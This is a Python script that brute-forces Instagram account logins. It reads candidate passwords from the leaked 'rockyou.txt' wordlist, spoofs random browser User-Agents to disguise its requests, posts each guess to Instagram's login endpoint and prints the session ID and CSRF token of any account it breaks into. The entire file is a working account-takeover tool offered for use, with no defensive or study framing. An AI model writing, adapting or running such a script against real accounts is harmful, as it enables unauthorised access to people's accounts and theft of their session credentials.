import requests
import json
from fake_useragent import UserAgent
from datetime import datetime


def pdd(user, passa):
    ua = UserAgent()  
    link = "https://www.instagram.com/accounts/login/"
    login_url = "https://www.instagram.com/accounts/login/ajax/"

    time = int(datetime.now().timestamp())
    response = requests.get(link)
    csrf = response.cookies["csrftoken"]

    payload = {
        "username": user,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time}:{passa}",
        "queryParams": {},
        "optIntoOneTap": "false",
    }

    login_header = {
        "User-Agent": str(ua.random),
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf,
    }
    try:
        login_response = requests.post(
            login_url, data=payload, headers=login_header
        )
        print(login_response.status_code)
        if login_response.status_code == 200:
            json_data = json.loads(login_response.text)

            if json_data["authenticated"]:

                print("login successful")
                cookies = login_response.cookies
                cookie_jar = cookies.get_dict()
                csrf_token = cookie_jar["csrftoken"]
                print("csrf_token: ", csrf_token)
                session_id = cookie_jar["sessionid"]
                print("session_id: ", session_id)
            else:
                print("login failed ", login_response.text)
        else:
            print("status code error")
    except Exception as e:
        #   traceback.print_exc()
        print(e)
        pass


def read_next_long_line(filename):
        with open(filename, 'r') as file:
            for line in file:
                if len(line.strip()) > 8:  
                    yield line.strip() 

passw = read_next_long_line("rockyou.txt")
while True:   
    user = ""
    if user =="":
        user = input("Enter username: ")      
    password = next(passw)
    print(password)
    try:
      pdd(user, password)
    except Exception as e:
        print(e)
        continue